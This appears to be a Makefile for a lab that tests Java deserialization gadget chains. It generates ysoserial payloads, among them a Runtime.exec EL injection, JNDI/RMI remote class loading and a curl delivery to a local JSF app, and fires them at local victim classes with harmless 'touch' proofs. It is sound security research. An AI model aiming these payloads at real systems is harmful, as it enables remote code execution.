init:
	pip install -r requirements.txt
	wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
	mkdir output
	mkdir -p data/libraries/commons-digester
	wget https://repo1.maven.org/maven2/commons-digester/commons-digester/1.8/commons-digester-1.8.jar -P data/libraries/commons-digester
	mkdir -p data/libraries/geronimo-atinject_1.0_spec
	wget https://repo1.maven.org/maven2/org/apache/geronimo/specs/geronimo-atinject_1.0_spec/1.0/geronimo-atinject_1.0_spec-1.0.jar -P data/libraries/geronimo-atinject_1.0_spec
	mkdir -p data/libraries/ognl
	mkdir -p data/libraries/log4j-api
	wget https://repo1.maven.org/maven2/ognl/ognl/3.1.21/ognl-3.1.21.jar -P data/libraries/ognl
	wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.11.1/log4j-api-2.11.1.jar -P data/libraries/log4j-api
	mkdir -p data/libraries/burningwave
	wget https://repo1.maven.org/maven2/io/github/toolfactory/jvm-driver/9.6.0/jvm-driver-9.6.0.jar -P data/libraries/burningwave
	wget https://repo1.maven.org/maven2/io/github/toolfactory/narcissus/1.0.7/narcissus-1.0.7.jar -P data/libraries/burningwave
	wget https://repo1.maven.org/maven2/org/burningwave/core/12.62.7/core-12.62.7.jar -P data/libraries/burningwave
	wget https://repo1.maven.org/maven2/org/burningwave/tools/0.25.12/tools-0.25.12.jar -P data/libraries/burningwave
	mkdir output/main output/fileupload output/jsf output/proof_jsf
	
	
parallel:
	parallel --eta --ungroup python3 main.py ::: "PrepareRMI" "AspectJWeaver" "BeanShell1" "C3P0" "Click1" "Clojure" "CommonsBeanutils1" "CommonsCollections1" "CommonsCollections2" "CommonsCollections3" "CommonsCollections4" "CommonsCollections5" "CommonsCollections6" "CommonsCollections7" "FileUpload1" "Groovy1" "JBossInterceptors1" "JRMPClient" "JRMPListener" "JSON1" "JavassistWeld1" "Jdk7u21" "Jython1" "MozillaRhino1" "MozillaRhino2" "ROME" "Spring1" "Spring2" "Vaadin1" "Wicket1" 

parallel-commonsCollections1:
	parallel --eta --ungroup python3 main.py ::: "CommonsCollections1" ::: "oracle:6" "oracle:7" "oracle:8" "oracle:9" "oracle:10"

parallel-rce:
	parallel --eta --jobs 0 --ungroup python3 main.py ::: "BeanShell1" "Click1" "Clojure" "CommonsBeanutils1" "CommonsCollections1" "CommonsCollections2" "CommonsCollections3" "CommonsCollections4" "CommonsCollections5" "CommonsCollections6" "CommonsCollections7" "Groovy1" "JBossInterceptors1" "JSON1" "JavassistWeld1" "Jdk7u21" "MozillaRhino1" "MozillaRhino2" "ROME" "Spring1" "Spring2" "Vaadin1" "Wicket1" ::: "oracle:6" "oracle:7" "oracle:8" "oracle:9,10,12,13,14" "oracle:11" "oracle:17" "oracle:15,16,18,19,20" "ibm:0" "apache:0"

test-victim:
	javac -cp ./data/libraries/commons-collections/commons-collections4-4.0.jar -d ./output/ ./src/main/Victim.java
	java -cp ./data/libraries/commons-collections/commons-collections4-4.0.jar -jar ysoserial-all.jar CommonsCollections4 "touch ./output/rce/test" > file.ser
	java -cp data/libraries/commons-collections/commons-collections4-4.0.jar:output main.Victim file.ser

test-jython:
	javac -cp ./data/libraries/jython-standalone/jython-standalone-2.5.2.jar -d ./output/ ./src/main/Victim.java
	java -cp ./data/libraries/jython-standalone/jython-standalone-2.5.2.jar -jar ysoserial-all.jar Jython1 "./src/scripts/jython.py;./jython.py" > file.ser
	java -cp data/libraries/jython-standalone/jython-standalone-2.5.2.jar:output main.Victim file.ser

test-aspect:
	javac -cp data/libraries/aspectjweaver/aspectjweaver-1.9.2.jar:data/libraries/commons-collections/commons-collections-3.2.2.jar -d ./output/ ./src/main/Victim.java
	java -cp data/libraries/aspectjweaver/aspectjweaver-1.9.2.jar:data/libraries/commons-collections/commons-collections-3.2.2.jar -jar ysoserial-all.jar AspectJWeaver "proof.txt;cHJvb2Y=" > file.ser
	java -cp data/libraries/aspectjweaver/aspectjweaver-1.9.2.jar:data/libraries/commons-collections/commons-collections-3.2.2.jar:output main.Victim file.ser

test-file-upload:
	javac -cp data/libraries/commons-fileupload/commons-fileupload-1.3.1.jar:data/libraries/commons-io/commons-io-2.4.jar -d ./output/ ./src/main/Victim.java
	java -cp data/libraries/commons-fileupload/commons-fileupload-1.3.1.jar:data/libraries/commons-io/commons-io-2.4.jar -jar ysoserial-all.jar FileUpload1 "write;output/fileupload;proof" > file.ser
	java -cp data/libraries/commons-fileupload/commons-fileupload-1.3.1.jar:data/libraries/commons-io/commons-io-2.4.jar:output main.Victim file.ser

test-wicket:
	javac -cp data/libraries/wicket-util/wicket-util-6.23.0.jar:data/libraries/slf4j-api/slf4j-api-1.6.4.jar -d ./output/ ./src/main/Victim.java
	java -cp data/libraries/wicket-util/wicket-util-6.23.0.jar:data/libraries/slf4j-api/slf4j-api-1.6.4.jar -jar ysoserial-all.jar Wicket1 "write;output/fileupload;proof" > file.ser
	java -cp data/libraries/wicket-util/wicket-util-6.23.0.jar:data/libraries/slf4j-api/slf4j-api-1.6.4.jar:output main.Victim file.ser

test-url-dns:
	javac -cp data/libraries/burningwave/tools-0.25.12.jar:data/libraries/burningwave/core-12.62.7.jar:data/libraries/burningwave/jvm-driver-9.6.0.jar:data/libraries/burningwave/narcissus-1.0.7.jar -d ./output/ ./src/main/DnsVictim.java
	/home/jvm/oracle/6/jdk1.6.0_41/bin/java -jar ysoserial-all.jar URLDNS "https://proof.com" > file.ser
	java -cp data/libraries/burningwave/tools-0.25.12.jar:data/libraries/burningwave/core-12.62.7.jar:data/libraries/burningwave/jvm-driver-9.6.0.jar:data/libraries/burningwave/narcissus-1.0.7.jar:output main.DnsVictim file.ser

test-jrmp-client:
	javac -d ./output/ ./src/main/Victim.java
	java -jar ysoserial-all.jar JRMPClient "127.0.0.1:8000" > file.ser
	java -cp output main.Victim file.ser

test-jrmp-listener:
	javac -d ./output/ ./src/main/Victim.java
	java -jar ysoserial-all.jar JRMPListener "8000" > file.ser
	java -cp output main.Victim file.ser

test-myfaces-setup:
	/opt/jdk1.8.0_202/bin/javac -cp data/libraries/myfaces-impl/myfaces-impl-2.2.9.jar:data/libraries/myfaces-api/myfaces-api-2.2.9.jar:data/libraries/apache-el/apache-el-8.0.27.jar:data/libraries/javax.servlet-api/javax.servlet-api-3.1.0.jar -d ./output/ ./src/main/VictimBean.java
	/opt/jdk1.8.0_202/bin/javac -cp data/libraries/myfaces-impl/myfaces-impl-2.2.9.jar:data/libraries/myfaces-api/myfaces-api-2.2.9.jar:data/libraries/apache-el/apache-el-8.0.27.jar:data/libraries/javax.servlet-api/javax.servlet-api-3.1.0.jar:data/libraries/gson/gson-2.8.9.jar -d ./output/ ./src/main/VictimApi.java
	cp -r src/webapp/* output/jsf/
	mkdir -p output/jsf/WEB-INF/classes/main
	mkdir -p output/jsf/WEB-INF/lib
	mv output/main/VictimBean.class output/jsf/WEB-INF/classes/main
	mv output/main/VictimApi.class output/jsf/WEB-INF/classes/main
	cp data/libraries/myfaces-impl/myfaces-impl-2.2.9.jar data/libraries/myfaces-api/myfaces-api-2.2.9.jar data/libraries/apache-el/apache-el-8.0.27.jar data/libraries/javax.servlet-api/javax.servlet-api-3.1.0.jar data/libraries/commons-digester/commons-digester-1.8.jar data/libraries/geronimo-atinject_1.0_spec/geronimo-atinject_1.0_spec-1.0.jar output/jsf/WEB-INF/lib/
	cp data/libraries/commons-collections/commons-collections-3.2.jar data/libraries/commons-beanutils/commons-beanutils-1.8.3.jar data/libraries/commons-logging/commons-logging-1.1.1.jar data/libraries/commons-digester/commons-digester-1.8.jar data/libraries/geronimo-atinject_1.0_spec/geronimo-atinject_1.0_spec-1.0.jar data/libraries/gson/gson-2.8.9.jar output/jsf/WEB-INF/lib/
	docker compose up -d	
	

test-myfaces1:
	/opt/jdk1.8.0_202/bin/java -cp data/libraries/myfaces-impl/myfaces-impl-2.2.9.jar:data/libraries/myfaces-api/myfaces-api-2.2.9.jar:data/libraries/apache-el/apache-el-8.0.27.jar:data/libraries/javax.servlet-api/javax.servlet-api-3.1.0.jar:data/libraries/mockito-core/mockito-core-1.10.19.jar:data/libraries/hamcrest-core/hamcrest-core-1.1.jar:data/libraries/objenesis/objenesis-2.1.jar -jar ysoserial-all.jar Myfaces1 "${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("touch tmp/proof_rce")}" > file.ser
	curl http://localhost:8080/jsf/?text=`cat file.ser | basenc --base64url | tr -d '\n'`

test-myfaces-shutdown:
	docker compose down

test-myfaces2:
	/opt/jdk1.8.0_202/bin/java -cp data/libraries/myfaces-impl/myfaces-impl-2.2.9.jar:data/libraries/myfaces-api/myfaces-api-2.2.9.jar:data/libraries/apache-el/apache-el-8.0.27.jar:data/libraries/javax.servlet-api/javax.servlet-api-3.1.0.jar:data/libraries/mockito-core/mockito-core-1.10.19.jar:data/libraries/hamcrest-core/hamcrest-core-1.1.jar:data/libraries/objenesis/objenesis-2.1.jar -jar ysoserial-all.jar Myfaces1 "http://localhost:8000:main.RemoteClass" > file.ser
	curl http://localhost:8080/jsf?text=`cat file.ser | basenc --base64url | tr -d '\n'`
	docker compose down

test-hibernate:
	javac -cp data/libraries/hibernate-core/hibernate-core-5.0.7.Final.jar:data/libraries/aopalliance/aopalliance-1.0.jar:data/libraries/jboss-logging/jboss-logging-3.3.0.Final.jar:data/libraries/transaction-api/javax.transaction-api-1.2.jar -d ./output/ ./src/main/Victim.java
	java -Dhibernate5 -cp data/libraries/hibernate-core/hibernate-core-5.0.7.Final.jar:data/libraries/aopalliance/aopalliance-1.0.jar:data/libraries/jboss-logging/jboss-logging-3.3.0.Final.jar:data/libraries/transaction-api/javax.transaction-api-1.2.jar -jar hibernate5-ysoserial-all.jar Hibernate1 "touch proof.txt" > file.ser
	java -Dhibernate5 -cp data/libraries/hibernate-core/hibernate-core-5.0.7.Final.jar:data/libraries/aopalliance/aopalliance-1.0.jar:data/libraries/jboss-logging/jboss-logging-3.3.0.Final.jar:data/libraries/transaction-api/javax.transaction-api-1.2.jar:output main.Victim file.ser

test-hibernate4:
	javac -cp data/libraries/hibernate-core/hibernate-core-4.3.11.Final.jar:data/libraries/aopalliance/aopalliance-1.0.jar:data/libraries/jboss-logging/jboss-logging-3.3.0.Final.jar:data/libraries/transaction-api/javax.transaction-api-1.2.jar:data/libraries/dom4j/dom4j-1.6.1.jar -d ./output/ ./src/main/Victim.java
	java -cp data/libraries/hibernate-core/hibernate-core-4.3.11.Final.jar:data/libraries/aopalliance/aopalliance-1.0.jar:data/libraries/jboss-logging/jboss-logging-3.3.0.Final.jar:data/libraries/transaction-api/javax.transaction-api-1.2.jar:data/libraries/dom4j/dom4j-1.6.1.jar -jar ysoserial-all.jar Hibernate1 "touch proof.txt" > file.ser
	java -cp data/libraries/hibernate-core/hibernate-core-4.3.11.Final.jar:data/libraries/aopalliance/aopalliance-1.0.jar:data/libraries/jboss-logging/jboss-logging-3.3.0.Final.jar:data/libraries/.transaction-api/javax.transaction-api-1.2.jar:data/libraries/dom4j/dom4j-1.6.1.jar:output main.Victim file.ser

test-hibernate-jndi:
	javac -cp data/libraries/hibernate-core/hibernate-core-5.0.7.Final.jar:data/libraries/aopalliance/aopalliance-1.0.jar:data/libraries/jboss-logging/jboss-logging-3.3.0.Final.jar:data/libraries/transaction-api/javax.transaction-api-1.2.jar -d ./output/ ./src/main/Victim.java
	java -Dhibernate5 -cp data/libraries/hibernate-core/hibernate-core-5.0.7.Final.jar:data/libraries/aopalliance/aopalliance-1.0.jar:data/libraries/jboss-logging/jboss-logging-3.3.0.Final.jar:data/libraries/transaction-api/javax.transaction-api-1.2.jar -jar hibernate5-ysoserial-all.jar Hibernate2 "rmi://localhost:1234/main.RemoteClass" > file.ser
	java -Dhibernate5 -cp data/libraries/hibernate-core/hibernate-core-5.0.7.Final.jar:data/libraries/aopalliance/aopalliance-1.0.jar:data/libraries/jboss-logging/jboss-logging-3.3.0.Final.jar:data/libraries/transaction-api/javax.transaction-api-1.2.jar:output main.Victim file.ser

test-new-commons8:
	javac -cp ./data/libraries/commons-beanutils/commons-beanutils-1.9.4.jar:data/libraries/commons-logging/commons-logging-1.2.jar -d ./output/ ./src/main/Victim.java
	java -cp ./data/libraries/commons-beanutils/commons-beanutils-1.9.4.jar:data/libraries/commons-logging/commons-logging-1.2.jar -jar _ysoserial-newgadgets.jar CommonsBeanutils2 "touch proof.txt" > file.ser
	java -cp data/libraries/commons-beanutils/commons-beanutils-1.9.4.jar:data/libraries/commons-logging/commons-logging-1.2.jar:output main.Victim file.ser

test-beanutils:
	javac -cp ./data/libraries/commons-beanutils/commons-beanutils-1.9.4.jar:data/libraries/log4j-core/log4j-core-2.21.0.jar -d ./output/ ./src/main/Victim.java
	java -cp ./data/libraries/commons-beanutils/commons-beanutils-1.9.4.jar:data/libraries/log4j-core/log4j-core-2.21.0.jar -jar _ysoserial-newgadgets.jar CommonsBeanutils2 "touch proof.txt" > file.ser
	java -cp data/libraries/commons-beanutils/commons-beanutils-1.9.4.jar:data/libraries/log4j-core/log4j-core-2.21.0.jar:output main.Victim file.ser

test-atomikos:
	javac -cp data/libraries/transactions-osgi/transactions-osgi-4.0.6.jar:data/libraries/jta/jta-1.1.jar -d ./output/ ./src/main/Victim.java
	java -cp data/libraries/transactions-osgi/transactions-osgi-4.0.6.jar:data/libraries/jta/jta-1.1.jar -jar _ysoserial-newgadgets.jar Atomikos "TODO" > file.ser
	java -cp data/libraries/transactions-osgi/transactions-osgi-4.0.6.jar:data/libraries/jta/jta-1.1.jar:output main.Victim file.ser

test-struts:
	javac -cp data/libraries/struts2-core/struts2-core-2.5.20.jar:data/libraries/struts2-jasperreports-plugin/struts2-jasperreports-plugin-2.5.20.jar:data/libraries/log4j-api/log4j-api-2.11.1.jar:data/libraries/ognl/ognl-3.1.21.jar:data/libraries/commons-lang/commons-lang3-3.8.1.jar:data/libraries/javassist/javassist-3.12.1.GA.jar -d ./output/ ./src/main/Victim.java
	java -cp data/libraries/struts2-core/struts2-core-2.5.20.jar:data/libraries/struts2-jasperreports-plugin/struts2-jasperreports-plugin-2.5.20.jar:data/libraries/log4j-api/log4j-api-2.11.1.jar:data/libraries/ognl/ognl-3.1.21.jar:data/libraries/commons-lang/commons-lang3-3.8.1.jar:data/libraries/javassist/javassist-3.12.1.GA.jar -jar _ysoserial-all.jar Struts2JasperReports "touch proof.txt" > file.ser
	java -cp data/libraries/struts2-core/struts2-core-2.5.20.jar:data/libraries/struts2-jasperreports-plugin/struts2-jasperreports-plugin-2.5.20.jar:data/libraries/log4j-api/log4j-api-2.11.1.jar:data/libraries/ognl/ognl-3.1.21.jar:data/libraries/commons-lang/commons-lang3-3.8.1.jar:data/libraries/javassist/javassist-3.12.1.GA.jar:output main.Victim file.ser

test-scala:
	/home/jvm/oracle/11/jdk-11.0.20/bin/javac -cp data/libraries/scala-library/scala-library-2.12.6.jar -d ./output/ ./src/main/Victim.java
	/home/jvm/oracle/11/jdk-11.0.20/bin/java -cp data/libraries/scala-library/scala-library-2.12.6.jar -jar ysoserial-all.jar CreateZeroFile "proof.txt" > file.ser
	/home/jvm/oracle/11/jdk-11.0.20/bin/java -cp data/libraries/scala-library/scala-library-2.12.6.jar:output main.Victim file.ser

test-ssrf:
	/home/jvm/adoptium/11/jdk-11.0.12+7/bin/javac -cp data/libraries/scala-library/scala-library-2.12.6.jar -d ./output/ ./src/main/Victim.java
	/home/jvm/adoptium/11/jdk-11.0.12+7/bin/java -cp data/libraries/scala-library/scala-library-2.12.6.jar -jar _ysoserial-all.jar Ssrf "http://localhost:1025/poc" > file.ser
	/home/jvm/adoptium/11/jdk-11.0.12+7/bin/java -cp data/libraries/scala-library/scala-library-2.12.6.jar:output main.Victim file.ser

test-springjta:
	javac -cp data/libraries/spring-core/spring-core-5.1.7.RELEASE.jar:data/libraries/spring-beans/spring-beans-5.1.7.RELEASE.jar:data/libraries/spring-tx/spring-tx-5.1.7.RELEASE.jar:data/libraries/spring-context/spring-context-5.1.7.RELEASE.jar:data/libraries/jta/jta-1.1.jar:data/libraries/commons-logging/commons-logging-1.2.jar -d ./output/ ./src/main/Victim.java
	java -cp data/libraries/spring-core/spring-core-5.1.7.RELEASE.jar:data/libraries/spring-beans/spring-beans-5.1.7.RELEASE.jar:data/libraries/spring-tx/spring-tx-5.1.7.RELEASE.jar:data/libraries/spring-context/spring-context-5.1.7.RELEASE.jar:data/libraries/jta/jta-1.1.jar:data/libraries/commons-logging/commons-logging-1.2.jar -jar _ysoserial-all.jar SpringJta "rmi://localhost:8000/main.class" > file.ser
	java -cp data/libraries/spring-core/spring-core-5.1.7.RELEASE.jar:data/libraries/spring-beans/spring-beans-5.1.7.RELEASE.jar:data/libraries/spring-tx/spring-tx-5.1.7.RELEASE.jar:data/libraries/spring-context/spring-context-5.1.7.RELEASE.jar:data/libraries/jta/jta-1.1.jar:data/libraries/commons-logging/commons-logging-1.2.jar:output main.Victim file.ser
